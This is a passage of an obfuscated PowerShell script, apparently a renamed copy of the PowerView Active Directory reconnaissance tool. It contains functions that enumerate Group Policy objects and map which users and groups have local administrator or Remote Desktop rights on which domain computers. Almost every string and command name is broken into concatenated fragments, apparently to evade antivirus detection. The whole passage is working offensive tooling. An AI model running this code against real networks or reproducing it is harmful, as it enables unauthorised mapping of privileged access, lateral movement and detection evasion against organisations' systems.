                    if ($IdentityInstance -match (('LD'+'AP'+':/'+'/Dhl^'+'CN=.*')-REpLAcE'Dhl',[CHAr]124)) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters[('Do'+'main')]) -and (-not $PSBoundParameters[('S'+'ea'+'rchBase')])) {
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('D'+'C='))) -replace ('DC'+'='),'' -replace ',','.'
                            &('Write-Ve'+'r'+'bose') ('[Get'+'-Doma'+'in'+'G'+'PO] '+'Extr'+'act'+'ed '+'doma'+'in '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                            $SearcherArguments[('Dom'+'ain')] = $IdentityDomain
                            $GPOSearcher = &('G'+'et-'+'Do'+'mainSe'+'arche'+'r') @SearcherArguments
                            if (-not $GPOSearcher) {
                                &('W'+'rite-Warni'+'n'+'g') ('[G'+'et'+'-'+'DomainGP'+'O]'+' '+'Un'+'abl'+'e '+'to'+' '+'ret'+'r'+'iev'+'e '+'do'+'ma'+'in '+'sea'+'rcher '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}') {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | &('ForE'+'a'+'ch'+'-Obje'+'ct') {$_.ToString('X').PadLeft(2,'0')})) -Replace ('('+'..)'),(('yHsFT'+'41').REPlAce(([Char]70+[Char]84+[Char]52),[STriNg][Char]36).REPlAce(([Char]121+[Char]72+[Char]115),[STriNg][Char]92))
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters[('L'+'D'+'APFilte'+'r')]) {
                    &('Wri'+'te'+'-Ve'+'rbose') ('['+'Get-Do'+'main'+'G'+'PO] '+'U'+'sing '+'addi'+'t'+'ional '+'LDAP'+' '+'fi'+'lter: '+"$LDAPFilter")
                    $Filter += "$LDAPFilter"
                }

                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                &('Write-'+'Ve'+'rbo'+'s'+'e') "[Get-DomainGPO] filter string: $($GPOSearcher.filter) "

                if ($PSBoundParameters[('Fi'+'n'+'dOne')]) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | &('Whe'+'r'+'e-Object') {$_} | &('Fo'+'r'+'Each'+'-Obje'+'ct') {
                    if ($PSBoundParameters[('Ra'+'w')]) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, ('Power'+'Bl'+'a.GP'+'O'+'.Raw'))
                    }
                    else {
                        if ($PSBoundParameters[('Se'+'ar'+'ch'+'Base')] -and ($SearchBase -Match ('^GC'+'://'))) {
                            $GPO = &('Conver'+'t-LD'+'APPr'+'oper'+'t'+'y') -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf(('DC'+'='))) -replace ('DC'+'='),'' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | &('Add-'+'Mem'+'ber') Noteproperty ('gpcfil'+'e'+'sy'+'spat'+'h') $gpcfilesyspath
                            }
                            catch {
                                &('Write-Ve'+'rbos'+'e') "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                            }
                        }
                        else {
                            $GPO = &('Conv'+'er'+'t-'+'LDAPPro'+'perty') -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, ('Pow'+'erB'+'la.GPO'))
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        &('Writ'+'e-Ve'+'rbos'+'e') ('['+'Get-Do'+'mainGP'+'O] '+'Err'+'o'+'r '+'dispo'+'si'+'ng '+'of'+' '+'the'+' '+'Results'+' '+'objec'+'t: '+"$_")
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShould'+'Pr'+'oces'+'s'), '')]
    [OutputType(('PowerB'+'la'+'.G'+'POGr'+'oup'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Disting'+'u'+'is'+'hedName'), ('Sa'+'m'+'Accoun'+'tName'), ('Na'+'me'))]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fil'+'ter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('A'+'DSPath'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Do'+'m'+'ai'+'nCo'+'ntroller'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('O'+'neLe'+'vel'), ('Sub'+'tree'))]
        [String]
        $SearchScope = ('Sub'+'t'+'ree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('Doma'+'i'+'n')]) { $SearcherArguments[('Dom'+'ai'+'n')] = $Domain }
        if ($PSBoundParameters[('LDAPFil'+'t'+'er')]) { $SearcherArguments[('LD'+'APF'+'ilter')] = $Domain }
        if ($PSBoundParameters[('S'+'earchB'+'ase')]) { $SearcherArguments[('SearchBa'+'s'+'e')] = $SearchBase }
        if ($PSBoundParameters[('S'+'erver')]) { $SearcherArguments[('S'+'erver')] = $Server }
        if ($PSBoundParameters[('Sea'+'rchSco'+'pe')]) { $SearcherArguments[('Sea'+'r'+'chS'+'cope')] = $SearchScope }
        if ($PSBoundParameters[('Resul'+'t'+'PageS'+'ize')]) { $SearcherArguments[('R'+'es'+'u'+'ltPageSize')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'e'+'rve'+'rTimeL'+'imit')]) { $SearcherArguments[('Server'+'TimeLi'+'mit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('To'+'mbsto'+'ne')]) { $SearcherArguments[('To'+'mbston'+'e')] = $Tombstone }
        if ($PSBoundParameters[('Cred'+'en'+'ti'+'al')]) { $SearcherArguments[('Cr'+'e'+'d'+'ential')] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters[('D'+'oma'+'in')]) { $ConvertArguments[('Doma'+'in')] = $Domain }
        if ($PSBoundParameters[('S'+'erver')]) { $ConvertArguments[('Ser'+'ver')] = $Server }
        if ($PSBoundParameters[('C'+'redent'+'ial')]) { $ConvertArguments[('Credent'+'ia'+'l')] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters[('Id'+'e'+'ntity')]) { $SearcherArguments[('Ide'+'nti'+'ty')] = $Identity }

        &('Get-D'+'oma'+'i'+'nGPO') @SearcherArguments | &('F'+'o'+'rEa'+'ch-Obj'+'ect') {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath

            $ParseArgs =  @{ ('G'+'p'+'tTmp'+'lPath') = ("$GPOPath\MACHINE\Microsoft\Windows "+(('NTvG'+'ZSecEditv'+'G'+'ZG'+'ptTm'+'pl.inf')  -RePlACe 'vGZ',[ChaR]92)) }
            if ($PSBoundParameters[('Cre'+'dent'+'ial')]) { $ParseArgs[('Credenti'+'a'+'l')] = $Credential }

            $Inf = &('Get'+'-'+'GptTmpl') @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains ('Gr'+'oup '+'M'+'em'+'bership'))) {
                $Memberships = @{}

                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | &('For'+'Each'+'-Ob'+'jec'+'t') {$_.Trim()}
                    $MembershipValue = $Membership.Value | &('Whe'+'re-'+'Object') {$_} | &('F'+'orEach-Ob'+'j'+'ect') { $_.Trim('*') } | &('W'+'h'+'e'+'re-Object') {$_}

                    if ($PSBoundParameters[('Reso'+'lveM'+'em'+'ber'+'sToSIDs')]) {
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch ('^'+'S'+'-1-.*')) {
                                    $ConvertToArguments = @{('Objec'+'tNam'+'e') = $Member}
                                    if ($PSBoundParameters[('D'+'omain')]) { $ConvertToArguments[('Domai'+'n')] = $Domain }
                                    $MemberSID = &('Conve'+'rtT'+'o-'+'S'+'ID') @ConvertToArguments

                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }

                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match (('^'+'gGz*').RepLAce('gGz','\')))) {
                        $GroupSID = $Membership.Key.Trim('*')
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = &('Con'+'vertFrom-S'+'ID') -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key

                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match ('Admi'+'n'+'ist'+'r'+'ators')) {
                                $GroupSID = ('S-1'+'-'+'5-32-54'+'4')
                            }
                            elseif ($Groupname -match ('Re'+'mo'+'te D'+'eskt'+'op')) {
                                $GroupSID = ('S'+'-1-5-32'+'-'+'555')
                            }
                            elseif ($Groupname -match ('Gues'+'t'+'s')) {
                                $GroupSID = ('S-1-'+'5-32'+'-546')
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{('Obj'+'e'+'ctNam'+'e') = $Groupname}
                                if ($PSBoundParameters[('D'+'omai'+'n')]) { $ConvertToArguments[('D'+'omai'+'n')] = $Domain }
                                $GroupSID = &('Conver'+'tTo'+'-SID') @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }

                    $GPOGroup = &('Ne'+'w'+'-Object') PSObject
                    $GPOGroup | &('A'+'dd'+'-Membe'+'r') Noteproperty ('GP'+'O'+'DisplayNa'+'m'+'e') $GPODisplayName
                    $GPOGroup | &('Ad'+'d-Membe'+'r') Noteproperty ('G'+'POName') $GPOName
                    $GPOGroup | &('A'+'dd-Memb'+'er') Noteproperty ('GPOP'+'ath') $GPOPath
                    $GPOGroup | &('Add'+'-'+'Memb'+'er') Noteproperty ('G'+'POTy'+'pe') ('Res'+'t'+'ricted'+'Gro'+'ups')
                    $GPOGroup | &('Add'+'-Membe'+'r') Noteproperty ('F'+'ilters') $Null
                    $GPOGroup | &('Add-Me'+'m'+'ber') Noteproperty ('G'+'ro'+'up'+'Name') $GroupName
                    $GPOGroup | &('A'+'dd-M'+'ember') Noteproperty ('G'+'r'+'oupSID') $GroupSID
                    $GPOGroup | &('Add'+'-Mem'+'ber') Noteproperty ('Grou'+'pMe'+'mberOf') $Membership.Value.Memberof
                    $GPOGroup | &('Add-M'+'em'+'ber') Noteproperty ('Grou'+'p'+'Me'+'mbers') $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, ('Powe'+'rB'+'l'+'a'+'.GPOGroup'))
                    $GPOGroup
                }
            }

            $ParseArgs =  @{
                ('GroupsX'+'MLp'+'at'+'h') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            &('Get-Grou'+'ps'+'XM'+'L') @ParseArgs | &('ForE'+'ach-Ob'+'jec'+'t') {
                if ($PSBoundParameters[('Reso'+'lveM'+'emb'+'ersT'+'oSIDs')]) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch ('^S-'+'1-.'+'*')) {

                                $ConvertToArguments = @{('Ob'+'jec'+'tName') = $Groupname}
                                if ($PSBoundParameters[('D'+'omain')]) { $ConvertToArguments[('Do'+'ma'+'in')] = $Domain }
                                $MemberSID = &('Con'+'v'+'ertT'+'o-S'+'ID') -Domain $Domain -ObjectName $Member

                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }

                $_ | &('Add-'+'Me'+'mber') Noteproperty ('GPO'+'Displ'+'ayNa'+'m'+'e') $GPODisplayName
                $_ | &('Add'+'-Memb'+'er') Noteproperty ('GPON'+'am'+'e') $GPOName
                $_ | &('Add-'+'Mem'+'ber') Noteproperty ('G'+'POType') ('GroupPol'+'icy'+'Pref'+'ere'+'nces')
                $_.PSObject.TypeNames.Insert(0, ('Pow'+'erBl'+'a.'+'GPOGroup'))
                $_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShoul'+'dPro'+'ces'+'s'), '')]
    [OutputType(('P'+'o'+'wer'+'Bla.'+'GPOUser'+'Local'+'GroupM'+'appi'+'ng'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Distingui'+'she'+'dNa'+'me'), ('Sa'+'m'+'Account'+'N'+'ame'), ('Nam'+'e'))]
        [String]
        $Identity,

        [String]
        [ValidateSet(('Administ'+'r'+'ators'), ('S-1'+'-'+'5-3'+'2-544'), ('RD'+'P'), ('R'+'emote D'+'e'+'s'+'ktop Us'+'ers'), ('S'+'-1-5-32-'+'55'+'5'))]
        $LocalGroup = ('Adm'+'inis'+'tra'+'t'+'ors'),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSPat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'omai'+'nCon'+'troll'+'er'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('One'+'Level'), ('S'+'ubtr'+'ee'))]
        [String]
        $SearchScope = ('S'+'u'+'btree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters[('D'+'om'+'ain')]) { $CommonArguments[('Dom'+'ain')] = $Domain }
        if ($PSBoundParameters[('Ser'+'ver')]) { $CommonArguments[('Se'+'rver')] = $Server }
        if ($PSBoundParameters[('Sear'+'c'+'hScope')]) { $CommonArguments[('S'+'earch'+'Scope')] = $SearchScope }
        if ($PSBoundParameters[('Resu'+'ltPageS'+'i'+'ze')]) { $CommonArguments[('R'+'esultPag'+'eSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Ser'+'ve'+'r'+'TimeLim'+'it')]) { $CommonArguments[('Se'+'rverT'+'imeL'+'imit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tom'+'bs'+'tone')]) { $CommonArguments[('Tomb'+'s'+'tone')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'edentia'+'l')]) { $CommonArguments[('C'+'reden'+'tia'+'l')] = $Credential }
    }

    PROCESS {
        $TargetSIDs = @()

        if ($PSBoundParameters[('I'+'d'+'entity')]) {
            $TargetSIDs += &('Get'+'-D'+'om'+'a'+'inObject') @CommonArguments -Identity $Identity | &('Sel'+'e'+'ct-Object') -Expand objectsid
            $TargetObjectSID = $TargetSIDs
            if (-not $TargetSIDs) {
                Throw ('[Get'+'-'+'Do'+'mainGPOUser'+'Local'+'GroupMapp'+'i'+'ng] '+'Unab'+'le '+'t'+'o '+'retriev'+'e'+' '+'SID'+' '+'f'+'or '+'id'+'en'+'tity '+"'$Identity'")
            }
        }
        else {
            $TargetSIDs = @('*')
        }

        if ($LocalGroup -match ('S-'+'1-5')) {
            $TargetLocalSID = $LocalGroup
        }
        elseif ($LocalGroup -match ('Admi'+'n')) {
            $TargetLocalSID = ('S-'+'1'+'-5-32-544')
        }
        else {
            $TargetLocalSID = ('S-1-5-32'+'-'+'555')
        }

        if ($TargetSIDs[0] -ne '*') {
            ForEach ($TargetSid in $TargetSids) {
                &('Wr'+'i'+'te-'+'Verbose') ('[Get-Doma'+'in'+'GPOUserL'+'ocal'+'Gr'+'o'+'upMappin'+'g]'+' '+'Enum'+'eratin'+'g '+'nest'+'ed '+'grou'+'p '+'mem'+'be'+'rships '+'fo'+'r: '+"'$TargetSid'")
                $TargetSIDs += &('Get-Domain'+'G'+'roup') @CommonArguments -Properties ('ob'+'je'+'ctsid') -MemberIdentity $TargetSid | &('S'+'ele'+'ct-O'+'bject') -ExpandProperty objectsid
            }
        }

        &('Write-V'+'er'+'bose') ('[Get-'+'Dom'+'ai'+'nG'+'POUser'+'Loc'+'alGro'+'upMapping] '+'Ta'+'rge'+'t '+'lo'+'c'+'alg'+'roup '+'SID'+': '+"$TargetLocalSID")
        &('Write-V'+'er'+'bose') ('[Get-Domai'+'nGPOUserLo'+'calG'+'ro'+'upMappi'+'ng]'+' '+'E'+'ffective'+' '+'ta'+'r'+'get '+'d'+'o'+'main '+'S'+'IDs: '+"$TargetSIDs")

        $GPOgroups = &('Get-DomainGPOLo'+'c'+'alGro'+'u'+'p') @CommonArguments -ResolveMembersToSIDs | &('ForEa'+'c'+'h-'+'Object') {
            $GPOgroup = $_
            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                $GPOgroup.GroupMembers | &('Wher'+'e-Obj'+'e'+'ct') {$_} | &('F'+'or'+'Each-Object') {
                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                        $GPOgroup
                    }
                }
            }
            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                    $GPOgroup
                }
            }
        } | &('S'+'or'+'t-Object') -Property GPOName -Unique

        $GPOgroups | &('Wh'+'ere-'+'O'+'bject') {$_} | &('F'+'o'+'rEach-Ob'+'ject') {
            $GPOname = $_.GPODisplayName
            $GPOguid = $_.GPOName
            $GPOPath = $_.GPOPath
            $GPOType = $_.GPOType
            if ($_.GroupMembers) {
                $GPOMembers = $_.GroupMembers
            }
            else {
                $GPOMembers = $_.GroupSID
            }

            $Filters = $_.Filters

            if ($TargetSIDs[0] -eq '*') {
                $TargetObjectSIDs = $GPOMembers
            }
            else {
                $TargetObjectSIDs = $TargetObjectSID
            }

            &('G'+'et-'+'Domai'+'nOU') @CommonArguments -Raw -Properties ('name,'+'d'+'is'+'ting'+'uis'+'hed'+'name') -GPLink $GPOGuid | &('F'+'o'+'rEach'+'-Obje'+'ct') {
                if ($Filters) {
                    $OUComputers = &('Get'+'-Domai'+'nComp'+'u'+'ter') @CommonArguments -Properties ('dnshostn'+'a'+'me,'+'disting'+'u'+'ishe'+'dname') -SearchBase $_.Path | &('Where'+'-Ob'+'jec'+'t') {$_.distinguishedname -match ($Filters.Value)} | &('Se'+'le'+'c'+'t-O'+'bject') -ExpandProperty dnshostname
                }
                else {
                    $OUComputers = &('Get'+'-DomainCompu'+'t'+'er') @CommonArguments -Properties ('d'+'n'+'shostname') -SearchBase $_.Path | &('Sel'+'e'+'ct-'+'Obje'+'ct') -ExpandProperty dnshostname
                }

                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}

                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = &('Get-Do'+'main'+'Ob'+'ject') @CommonArguments -Identity $TargetSid -Properties ('sa'+'ma'+'c'+'counttype,sam'+'account'+'name'+',distingu'+'i'+'sh'+'edname,o'+'bjects'+'id')

                        $IsGroup = @(('2684'+'3545'+'6'),('2684354'+'57'),('5368'+'709'+'12'),('536870'+'9'+'13')) -contains $Object.samaccounttype

                        $GPOLocalGroupMapping = &('N'+'ew-'+'Object') PSObject
                        $GPOLocalGroupMapping | &('Add'+'-Mem'+'ber') Noteproperty ('Objec'+'tNa'+'m'+'e') $Object.samaccountname
                        $GPOLocalGroupMapping | &('Add-M'+'emb'+'er') Noteproperty ('Ob'+'j'+'ectDN') $Object.distinguishedname
                        $GPOLocalGroupMapping | &('Add-'+'Memb'+'er') Noteproperty ('Obj'+'ectS'+'ID') $Object.objectsid
                        $GPOLocalGroupMapping | &('A'+'d'+'d-Member') Noteproperty ('D'+'omai'+'n') $Domain
                        $GPOLocalGroupMapping | &('A'+'d'+'d-M'+'ember') Noteproperty ('IsG'+'roup') $IsGroup
                        $GPOLocalGroupMapping | &('A'+'dd-Membe'+'r') Noteproperty ('GPO'+'D'+'i'+'splayNam'+'e') $GPOname
                        $GPOLocalGroupMapping | &('A'+'d'+'d-Member') Noteproperty ('GPO'+'Guid') $GPOGuid
                        $GPOLocalGroupMapping | &('Ad'+'d'+'-M'+'ember') Noteproperty ('GP'+'OPa'+'th') $GPOPath
                        $GPOLocalGroupMapping | &('A'+'dd'+'-Me'+'mber') Noteproperty ('GPOTy'+'p'+'e') $GPOType
                        $GPOLocalGroupMapping | &('Add'+'-Membe'+'r') Noteproperty ('Con'+'tai'+'n'+'erName') $_.Properties.distinguishedname
                        $GPOLocalGroupMapping | &('A'+'dd-'+'Member') Noteproperty ('Co'+'mp'+'uterName') $OUComputers
                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, ('Pow'+'er'+'B'+'la.GPOLocalG'+'r'+'oup'+'Mappin'+'g'))
                        $GPOLocalGroupMapping
                    }
                }
            }

            &('Get-Doma'+'i'+'nSi'+'te') @CommonArguments -Properties ('siteo'+'b'+'j'+'ectb'+'l,d'+'is'+'tingui'+'sh'+'edname') -GPLink $GPOGuid | &('ForE'+'ach'+'-Obj'+'ect') {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = &('Get-DomainObj'+'ec'+'t') @CommonArguments -Identity $TargetSid -Properties ('samaccountt'+'ype'+',sa'+'mac'+'count'+'name,di'+'st'+'inguish'+'ed'+'nam'+'e,ob'+'jectsid')

                    $IsGroup = @(('26'+'8435'+'456'),('268'+'435'+'457'),('53'+'6'+'870912'),('536'+'87091'+'3')) -contains $Object.samaccounttype

                    $GPOLocalGroupMapping = &('New-'+'Obj'+'ect') PSObject
                    $GPOLocalGroupMapping | &('Add-M'+'emb'+'er') Noteproperty ('Obj'+'ectN'+'a'+'me') $Object.samaccountname
                    $GPOLocalGroupMapping | &('Add'+'-Mem'+'ber') Noteproperty ('Ob'+'jectDN') $Object.distinguishedname
                    $GPOLocalGroupMapping | &('Add-'+'Memb'+'er') Noteproperty ('Ob'+'ject'+'SID') $Object.objectsid
                    $GPOLocalGroupMapping | &('Add'+'-M'+'ember') Noteproperty ('I'+'sGro'+'up') $IsGroup
                    $GPOLocalGroupMapping | &('Add-Me'+'mbe'+'r') Noteproperty ('Do'+'main') $Domain
                    $GPOLocalGroupMapping | &('Add-'+'M'+'ember') Noteproperty ('GP'+'ODi'+'spla'+'yNam'+'e') $GPOname
                    $GPOLocalGroupMapping | &('Add-'+'Membe'+'r') Noteproperty ('G'+'POGuid') $GPOGuid
                    $GPOLocalGroupMapping | &('Ad'+'d-M'+'em'+'ber') Noteproperty ('GP'+'OPath') $GPOPath
                    $GPOLocalGroupMapping | &('Add'+'-M'+'ember') Noteproperty ('GPO'+'T'+'ype') $GPOType
                    $GPOLocalGroupMapping | &('Add-M'+'emb'+'er') Noteproperty ('Conta'+'i'+'ne'+'rNam'+'e') $_.distinguishedname
                    $GPOLocalGroupMapping | &('A'+'d'+'d-Member') Noteproperty ('C'+'ompu'+'ter'+'Name') $_.siteobjectbl
                    $GPOLocalGroupMapping.PSObject.TypeNames.Add(('Po'+'werBla.GPOLo'+'c'+'alG'+'r'+'oupM'+'a'+'p'+'ping'))
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SS'+'ho'+'uldProcess'), '')]
    [OutputType(('P'+'owe'+'r'+'Bl'+'a.GGPOComputerLocalG'+'roupMe'+'mber'))]
    [CmdletBinding(DefaultParameterSetName = {'Com'+'pu'+'t'+'erI'+'dentity'})]
    Param(
        [Parameter(Position = 0, ParameterSetName = "COMP`UTe`Ri`DEn`TITy", Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Compu'+'t'+'erNam'+'e'), ('C'+'ompute'+'r'), ('Dis'+'t'+'i'+'nguishe'+'dName'), ('S'+'amAcco'+'u'+'ntName'), ('N'+'ame'))]
        [String]
        $ComputerIdentity,

        [Parameter(Mandatory = $True, ParameterSetName = "OU`ID`entITy")]
        [Alias('OU')]
        [String]
        $OUIdentity,

        [String]
        [ValidateSet(('Ad'+'mi'+'nistra'+'to'+'rs'), ('S-1'+'-'+'5-32'+'-544'), ('R'+'DP'), ('Remo'+'t'+'e '+'D'+'esk'+'top Us'+'ers'), ('S'+'-1'+'-5-32-5'+'55'))]
        $LocalGroup = ('A'+'dmin'+'istrators'),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('AD'+'SPa'+'th'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('DomainCon'+'trol'+'l'+'er'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('One'+'Lev'+'el'), ('Sub'+'tree'))]
        [String]
        $SearchScope = ('Su'+'btr'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters[('Do'+'main')]) { $CommonArguments[('Domai'+'n')] = $Domain }
        if ($PSBoundParameters[('Se'+'rver')]) { $CommonArguments[('Serve'+'r')] = $Server }
        if ($PSBoundParameters[('Search'+'Scop'+'e')]) { $CommonArguments[('Sear'+'chSc'+'ope')] = $SearchScope }
        if ($PSBoundParameters[('Resul'+'tP'+'age'+'Siz'+'e')]) { $CommonArguments[('R'+'e'+'sul'+'tP'+'ageSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Se'+'rve'+'r'+'Ti'+'meLimit')]) { $CommonArguments[('S'+'erverT'+'im'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombst'+'o'+'ne')]) { $CommonArguments[('Tom'+'bst'+'one')] = $Tombstone }
        if ($PSBoundParameters[('C'+'rede'+'ntial')]) { $CommonArguments[('C'+'r'+'ede'+'ntial')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[('Comp'+'u'+'terIden'+'t'+'ity')]) {
            $Computers = &('G'+'et-D'+'omain'+'Co'+'mp'+'uter') @CommonArguments -Identity $ComputerIdentity -Properties ('disti'+'n'+'guis'+'hednam'+'e,'+'dnsho'+'s'+'tname')

            if (-not $Computers) {
                throw ('[Get-D'+'omainGP'+'OCo'+'mp'+'u'+'terLo'+'calGroupMap'+'pin'+'g'+'] '+'Com'+'puter'+' '+"$ComputerIdentity "+'not'+' '+'fou'+'nd'+'. '+'T'+'ry '+'a '+'full'+'y '+'qual'+'ifi'+'ed '+'host'+' '+'n'+'ame.')
            }

            ForEach ($Computer in $Computers) {

                $GPOGuids = @()

                $DN = $Computer.distinguishedname
                $OUIndex = $DN.IndexOf(('O'+'U='))
                if ($OUIndex -gt 0) {
                    $OUName = $DN.SubString($OUIndex)
                }
                if ($OUName) {
                    $GPOGuids += &('Get-Do'+'ma'+'in'+'OU') @CommonArguments -SearchBase $OUName -LDAPFilter ('(gp'+'li'+'nk=*)') | &('F'+'orEach-O'+'bjec'+'t') {
                        &('Select'+'-S'+'t'+'ri'+'ng') -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &('Fo'+'rE'+'ach'+'-Ob'+'ject') {$_.Matches | &('Se'+'lect-'+'O'+'bject') -ExpandProperty Value }
                    }
                }

                &('W'+'ri'+'te-'+'Ve'+'rbose') "Enumerating the sitename for: $($Computer.dnshostname) "
                $ComputerSite = (&('G'+'e'+'t-'+'NetCo'+'mputerSiteN'+'a'+'me') -ComputerName $Computer.dnshostname).SiteName
